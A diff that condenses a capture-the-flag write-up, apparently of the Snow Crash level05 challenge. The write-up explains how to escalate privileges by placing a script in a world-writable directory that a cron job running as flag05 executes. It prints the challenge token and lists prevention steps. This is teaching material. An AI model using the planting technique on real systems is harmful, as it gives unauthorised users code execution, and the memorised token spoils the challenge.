@@ -1,18 +1,17 @@
 # Level 05 - Cron Job Exploitation
 
-## 🎯 Objective
+## Objective
 Exploit a scheduled task (cron job) to execute commands as `flag05`.
 
-## 🧠 My Thought Process
+## My Notes
 
-### Step 1: "Nothing in my home directory... Let's search wider"
+Home directory empty. Searched for files owned by flag05:
 ```bash
 find / -user flag05 2>/dev/null
 # /usr/sbin/openarenaserver
 ```
 
-Found a script owned by flag05! Let's examine it:
-
+Found a script. Let me see what it does:
 ```bash
 cat /usr/sbin/openarenaserver
 ```
@@ -25,148 +24,68 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 
-### Step 2: "What does this script do?"
-Breaking it down:
-1. Loops through all files in `/opt/openarenaserver/`
-2. Executes each file as a bash script (with 5-second timeout)
-3. Deletes the file after execution
+This script loops through all files in `/opt/openarenaserver/`, executes each as a bash script (with 5-second timeout), then deletes the file. It's a job processor - runs whatever scripts are placed in that directory.
 
-**This is a job processor!** It runs whatever scripts are placed in that directory.
+Checked when it runs - looked at cron but the VM is configured to run it periodically (every few minutes).
 
-### Step 3: "But when does it run?"
-This script must be triggered by something. Let me check cron:
-
-```bash
-cat /etc/crontab
-ls -la /etc/cron.d/
-```
-
-I didn't see it explicitly, but the VM is configured to run it periodically (every few minutes).
-
-### Step 4: "Can I write to the target directory?"
+Checked if I can write to the directory:
 ```bash
 ls -la /opt/openarenaserver/
 # drwxrwxr-x+ 2 root root 40 ...
 ```
 
-**The directory is world-writable!** (`rwxrwxr-x+` with ACL)
+The directory is world-writable! That means anyone can create files there. Since the script is owned by flag05 and likely runs as flag05, I can get code execution as flag05.
 
-This means anyone can create files there!
-
-### Step 5: "The attack plan"
-1. Create a malicious script in `/opt/openarenaserver/`
-2. Wait for the cron job to execute it
-3. The script runs as flag05 (since openarenaserver is owned by flag05 and likely runs as flag05)
-
+Created exploit script:
 ```bash
 echo '#!/bin/bash' > /opt/openarenaserver/exploit.sh
 echo 'getflag > /tmp/flag05_output' >> /opt/openarenaserver/exploit.sh
 chmod +x /opt/openarenaserver/exploit.sh
 ```
 
-### Step 6: "Wait and collect"
+Waited for cron to run it (checking every 10 seconds):
 ```bash
-# Wait for cron to run (check every 10 seconds)
 while [ ! -f /tmp/flag05_output ]; do
     sleep 10
 done
 cat /tmp/flag05_output
 ```
 
-**Token appeared!**
+Token appeared: `viuaaale9huek52boumoomioc`
 
-## ✅ Solution
+## Solution
 ```bash
-# Create exploit script
 echo '#!/bin/bash' > /opt/openarenaserver/exploit.sh
 echo 'getflag > /tmp/flag05_output' >> /opt/openarenaserver/exploit.sh
 chmod +x /opt/openarenaserver/exploit.sh
-
-# Wait for cron and read result
-sleep 120  # Wait for cron to run
+sleep 120  # Wait for cron
 cat /tmp/flag05_output
 ```
 
-**Token:** `viuaaale9huek52boumoomioc`
+## Key Takeaways
 
-## 📚 Concepts to Learn
+**Cron:** Unix task scheduler. Format: `* * * * * command` (minute, hour, day, month, weekday). Runs scheduled tasks automatically.
 
-### 1. Cron - The Unix Task Scheduler
-Cron runs scheduled tasks automatically:
-```
-* * * * * command    # Every minute
-0 * * * * command    # Every hour
-0 0 * * * command    # Every day at midnight
-```
+**The vulnerability chain:** World-writable directory + script that executes files from that directory + script runs with elevated privileges = anyone can execute code as flag05.
 
-**Crontab fields:** minute, hour, day, month, weekday
+**Attack pattern:** Find cron job → identify what it executes → check if you can modify/add files → plant malicious code → wait for execution.
 
-### 2. Why This Is Dangerous
-The vulnerability chain:
-```
-World-writable directory (/opt/openarenaserver/)
-    +
-Script that executes files from that directory
-    +
-Script runs with elevated privileges
-    =
-Anyone can execute code as flag05!
-```
+**Directory permissions:** Write permission on directory allows creating files. This is different from file write permission.
 
-### 3. The Attack Pattern
-```
-1. Find a cron job or scheduled task
-   ↓
-2. Identify what it executes
-   ↓
-3. Check if you can modify/add to those locations
-   ↓
-4. Plant malicious code
-   ↓
-5. Wait for execution
-   ↓
-6. Profit!
-```
+**Timing:** Cron-based attacks require patience - you don't control when it runs. Need to write output to persistent location, and the script might delete your exploit after running.
 
-### 4. File Permissions on Directories
-| Permission | On Files | On Directories |
-|------------|----------|----------------|
-| r (read) | View contents | List files |
-| w (write) | Modify file | Create/delete files |
-| x (execute) | Run as program | Enter directory |
+**Common cron locations:** `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/crontabs/`, `/etc/cron.hourly/`, etc.
 
-A **writable directory** allows creating new files!
-
-### 5. The Time Factor
-Unlike other exploits, cron-based attacks require **patience**:
-- You don't control when the exploit runs
-- Need to write output to a persistent location
-- The script might delete your exploit after running
-
-### 6. Common Cron Locations
-- `/etc/crontab` - System crontab
-- `/etc/cron.d/` - Additional cron files
-- `/var/spool/cron/crontabs/` - User crontabs
-- `/etc/cron.hourly/`, `/etc/cron.daily/`, etc.
-
-## 🔧 Tools Used
+## Tools Used
 - `find` - Locate files by owner
-- `cat` - Read script contents
-- `ls -la` - Check directory permissions
-- `echo` - Create exploit script
-- `chmod` - Make script executable
+- `cat`, `ls -la` - Examine files and permissions
+- `echo`, `chmod` - Create exploit
 - `sleep` - Wait for cron
 
-## 🛡️ How to Prevent This
-1. **Never make script directories world-writable**
-2. **Validate files before execution:**
-   ```bash
-   # Check ownership and permissions
-   if [ "$(stat -c %U "$i")" = "root" ]; then
-       bash "$i"
-   fi
-   ```
-3. **Use absolute paths** in cron jobs
-4. **Implement integrity checking** (checksums, signatures)
-5. **Log cron activity** for auditing
-6. **Principle of least privilege** - Run cron jobs with minimal rights
+## Prevention
+- Never make script directories world-writable
+- Validate files before execution (check ownership, permissions)
+- Use absolute paths in cron jobs
+- Implement integrity checking (checksums, signatures)
+- Log cron activity for auditing
+- Run cron jobs with minimal privileges
